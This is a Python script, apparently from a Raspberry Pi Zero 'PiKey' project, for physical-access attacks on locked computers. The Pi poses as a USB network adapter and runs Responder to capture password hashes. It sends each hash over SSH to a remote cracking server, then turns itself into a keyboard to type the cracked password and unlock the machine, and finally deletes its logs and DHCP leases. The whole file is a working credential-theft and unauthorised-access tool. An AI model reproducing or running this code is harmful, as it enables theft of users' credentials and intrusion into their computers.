# Script: picracking.py
# Date	: 16/02/2017
# Ver	: 0.5
#
# Description:
# This script executes the following steps and should be placed in rc.local to run at boot.
# 	1. Configure the Pi Zero to enter g_ether mode and become a dhcp server.
#	2. Execute Responder.
#	3. Monitor Responder.db for changes, then grab the last entered credentials and send these to a remote cracking server.
#	4. If a password is returned then switch into hid mode and enter the password!
# 	5. Shutdown
#
# Notes:
# 	Usage: picracking.py <user> <ip> <keypath> <ledtype: blinktimport, scrollphatimport - blank=none>
# v0.1:
#	- Initial version.
#	- ctrl-alt-del and shutdown currently disabled for debugging (search ##DEBUG for lines).
# v0.2
#	- Fixed issue with infinite loop consuming all the CPU.
#	- Uncommented send ctrl+alt+del
# v0.3
#       - Added dynamic loading of LED modules for different LED types
#       - Added shutdown of LEDs at the end to indicate the Pi should be disconnected soon
# v0.4
#       - Check for Remote Connectivity before starting Responder
#
# v0.5
#	- Made SSH server details and LED's paramters
#	- General tidy up for install script
#
# v0.6
#	- Added special characters to keyboard output
#
################################################################

import logging
import subprocess
import json
import time
import sys
import os
import shutil
import colorsys 
import random
import importlib

from subprocess import Popen

#Setup variables - move to config file?
#Edit these ones depending on setup.
HOST = "%s@%s" %(sys.argv[1], sys.argv[2])
KEY = sys.argv[3]
if len(sys.argv) == 5:
	LEDTYPE = sys.argv[4]
else:
	LEDTYPE = ""

#Edit these ones if the defaults just aren't good enough for you!
LOGFOLDER = "/home/pi/PiKey/logs"
LOGFILE = "%s/%s.log" %(LOGFOLDER,time.strftime("%Y%m%d-%H%M%S")) 
CONTROLRESPONDER = "/boot/control/responder"
RESPONDER = "/home/pi/PiKey/Responder"
RESPONDERDB = "%s/Responder.db" %(RESPONDER)
RESONPDERLOGS = "%s/logs" %(RESPONDER)
RESPONDEREX = "%s/Responder.py -I usb0 -f -w -r -d -F" %(RESPONDER)
RESPONDERQUERY = "pragma busy_timeout=1000; select type,cleartext,fullhash from responder where length(fullhash) > 0 and user not like \"%$\" order by rowid desc limit 1"
RESPONDERDEL = "delete from responder"
SCREENEX = "/usr/bin/screen -dmS responder python %s" %(RESPONDEREX)
DHCP = "/usr/sbin/dhcpd usb0"
DHCPLEASE = "/var/lib/dhcp/dhcpd.leases"
SQLITE = "/usr/bin/sqlite3"
GETHER = "modprobe g_ether idVendor=0x04b3 idProduct=0x4010"
GETHERUP = "ifup usb0"
GETHERREMOVE = "modprobe -r g_ether"
GHID = "modprobe g_hid"
GHIDREMOVE = "modprobe -r g_hid"
GHIDCOMMAND = "/home/pi/PiKey/hid-gadget /dev/hidg0 keyboard > /dev/null"

#LETS BEGIN......
################################################################

#Import the correct LED module
if LEDTYPE != "":
        ledcontrol = importlib.import_module(LEDTYPE)
        LEDS = True
else:
        LEDS = False

#Setup log folder
if not os.path.isdir(LOGFOLDER):
	os.mkdir(LOGFOLDER)

#Setup log file
logging.basicConfig(level=logging.INFO, 
                    filename=LOGFILE,
                    format='%(asctime)s %(message)s')


#Ping test for checking network connectivity
def check_ping():
    hostname = "8.8.8.8"
    response = os.system("ping -c 1 " + hostname)
    # and then check the response...
    if response == 0:
        pingstatus = "Ok"
    else:
        pingstatus = "Error"

    return pingstatus
					
	
#PROCESS RESPONDER DATA AND PASS TO REMOTE CRACKER
def remotecrack( data ):

	#Variables to hold the clear text password
	clearTextPassword = ""
	clearTextPasswordFound = False

	#Split the entry into components, type,cleartext,fullhash
	entrytype = data.decode().split('|')[0]
	cleartext = data.decode().split('|')[1]
	fullhash = data.decode().split('|')[2]

	#If the cleartext entry does not exist
	if not cleartext:

		#If the type of hash is not salted. Responder doesn't currently support non-salted hashes so this is for future use
		if entrytype == "NOT_IN_USE":
			#Send to findhash to search the web
			print("Not in use")		
		#Hash is salted, send to the cracking server
		else:
			#Execute SSH, a JSON response will be sent back with either success or failure.
			ssh = subprocess.check_output(["ssh", "-i", KEY, HOST, fullhash])

			#Parse the JSON response.
			data = json.loads(ssh)

			#Success? If so, write to the control hid file.
			if data['status'] == "success":
				clearTextPassword = data['password']
				clearTextPasswordFound = True
				
	#Clear text password was found
	else:
		clearTextPassword = cleartext
		clearTextPasswordFound = True
		
	# If a clear text password has been found somehow
	if clearTextPasswordFound == True:
		return clearTextPassword
	else:
		return False

#CLEAR RESPONDER LOGS & DHCP LEASES
def purge():

	#Tidy Up Responder
	if os.path.isfile(RESPONDERDB):
		subprocess.call([SQLITE, RESPONDERDB, RESPONDERDEL])
	shutil.rmtree(RESONPDERLOGS)
	os.mkdir(RESONPDERLOGS)
	
	#Clear DHCP leases
	open(DHCPLEASE, 'w').close()
	
	return

#Start by purging, just in case the device wasn't shutdown properly last time	
logging.info("Credential snagging starting...")
ledcontrol.ledstage(1) if LEDS == True else 0
logging.info("Purging previous data")
purge()

logging.info("Configuring g_ether")
#Load g_ether module
subprocess.call("%s" % GETHER,shell=True)
time.sleep(1)
subprocess.call("%s" % GETHERUP,shell=True)

#Start DHCP server
logging.info("Starting DHCP Server")
subprocess.call("%s" % DHCP,shell=True)

#Ensure that the device is connected to it's WIFI network for exporting data
pingstatus = check_ping()
while (pingstatus == 'Error'):
	logging.info("Remote Connection not initilised, initilising")

	#Terminate the existing WIFI
	subprocess.call("wpa_cli -i wlan0 terminate", shell=True)
	#Wait half a second for the process to terminate
	time.sleep(0.5)

	#Call WPA_Suppliment with the config again to initilise the WIFI
	subprocess.call("/sbin/wpa_supplicant -s -B -P /run/wpa_supplicant.wlan0.pid -i wlan0 -D nl80211,wext -c /etc/wpa_supplicant/wpa_supplicant.conf" ,shell=True)
	time.sleep(3)
	subprocess.call("dhclient wlan0", shell=True)

	pingstatus = check_ping()


logging.info("Remote Connection Initilised")
ledcontrol.ledstage(2) if LEDS == True else 0

#Execute responder (only if control file is present)
if os.path.isfile(CONTROLRESPONDER):
	
	#Load responder in a seperate screen
	logging.info("Starting Responder screen: %s." %(SCREENEX))
	subprocess.call("%s" % SCREENEX,shell=True)
	ledcontrol.ledstage(3) if LEDS == True else 0
	
	#Give responder a few seconds to startup
	time.sleep(2)

	#Check for Responder.db - on a first execute this might not be present and responder might need to be run manually to create it.
	if os.path.isfile(RESPONDERDB):
		
		logging.info("Monitoring Responder.db for changes")
		#Grab the last modified date of Responder.db
		lastmodified = os.stat(RESPONDERDB).st_mtime

		#Inf loop to monitor for changes
		while 1:
			#Check the current time stamp
			thismodified = os.stat(RESPONDERDB).st_mtime 
			if thismodified > lastmodified:
				logging.info("Responder.db has been modified. Processing changes")
				
				#File has been modified, so lets process the changes...
				lastmodified = thismodified
				
				#Lets not be too quick here, db can still be locked, so lets just give it a few seconds! :)
				time.sleep(2)
				
				#Grab the last valid hash from responder.db
				logging.info("Grabbing last entry from database")
				respondersql = subprocess.check_output([SQLITE, RESPONDERDB, RESPONDERQUERY])
				
				#Send the hash to the cracking server
				logging.info("Performing remote check")
				ledcontrol.ledstage(4) if LEDS == True else 0
				password = remotecrack(respondersql)
				
				if password != False:
					ledcontrol.ledstage(5) if LEDS == True else 0
					#Got a password, switch into HID mode to send it.
					logging.info("Password cracked, switching to HID mode")
					
					#Load HID module
					subprocess.call("%s" % GETHERREMOVE,shell=True)
					time.sleep(0.5)
					subprocess.call("%s" % GHID,shell=True)
					
					#Give the OS time to detect the new HID and load drivers if needed. This can be reduced.
					time.sleep(10)
					ledcontrol.ledstage(6) if LEDS == True else 0

					#Some machines need a quick poke to take them out of the screensaver before we sent control-alt-delete
					subprocess.call('echo "left-ctrl" | %s' %(GHIDCOMMAND), shell=True)
					time.sleep(1)
					
					#Locked, so send ctrl alt del first
					subprocess.call('echo "left-ctrl left-alt del" | %s' %(GHIDCOMMAND), shell=True)					

					#Let the screen unlock
					time.sleep(1)
					ledcontrol.ledstage(7) if LEDS == True else 0
					
					#Send the password!
					logging.info("Sending password...")
					
					for char in list(password):
						#Uppercase
						if char.isupper():
							char = "left-shift %s" %(char.lower())
						#Space
						elif char == " ":
							char = "space"
						
						#Special characters...
						elif char == "%":
							char = "left-shift 5"
							
						elif char == "!":
							char = "left-shift 1"
							
						elif char == ".":
							char = "period"
							
						elif char == "`":
							char = "backquote"
							
						elif char == "~":
							char = "left-shift hash"
							
						elif char == "+":
							char = "kp-plus"
						
						elif char == "=":
							char = "equal"
							
						elif char == "_":
							char = "left-shift minus"
							
						elif char == "\"":
							char = "left-shift 2"
							
						elif char == "'":
							char = "quote"
							
						elif char == ":":
							char = "left-shift semicolon"
							
						elif char == ";":
							char = "semicolon"
							
						elif char == "<":
							char = "left-shift comma"
							
						elif char == ",":
							char = "comma"
							
						elif char == ">":
							char = "left-shift period"
							
						elif char == "?":
							char = "left-shift slash"
							
						elif char == "\\":
							char = "backslash"
							
						elif char == "|":
							char = "left-shift backslash"
							
						elif char == "/":
							char = "slash"
							
						elif char == "{":
							char = "left-shift lbracket"
							
						elif char == "}":
							char = "left-shift rbracket"
							
						elif char == "(":
							char = "left-shift 9"
							
						elif char == ")":
							char = "left-shift 0"
							
						elif char == "]":
							char = "rbracket"
							
						elif char == "[":
							char = "lbracket"
							
						elif char == "&":
							char = "left-shift 7"
							
						elif char == "^":
							char = "left-shift 6"
							
						elif char == "*":
							char = "kp-multiply"
							
						elif char == "$":
							char = "left-shift 4"
							
						elif char == "#":
							char = "hash"
							
						elif char == "@":
							char = "left-shift quote"
						

						subprocess.call('echo "%s" | %s' %(char,GHIDCOMMAND), shell=True)
					
					subprocess.call('echo "return" | %s' %(GHIDCOMMAND), shell=True)
					ledcontrol.ledstage(8) if LEDS == True else 0
					
					#Tidy up
					logging.info("Purging logs")
					purge()
					
					#Shutdown?
					#Clear LEDs
					ledcontrol.ledclear()
					##DEBUG
					subprocess.call("shutdown now", shell=True)
					
					break

				else:			
					#Sleep before we try the next loop.
					logging.info("Password was not cracked, waiting...")
					time.sleep(0.5)	
			else:
				time.sleep(0.5)
	else:
		logging.info("Responder.db not found at: %s - Exiting Script." %(RESPONDERDB))
		sys.exit
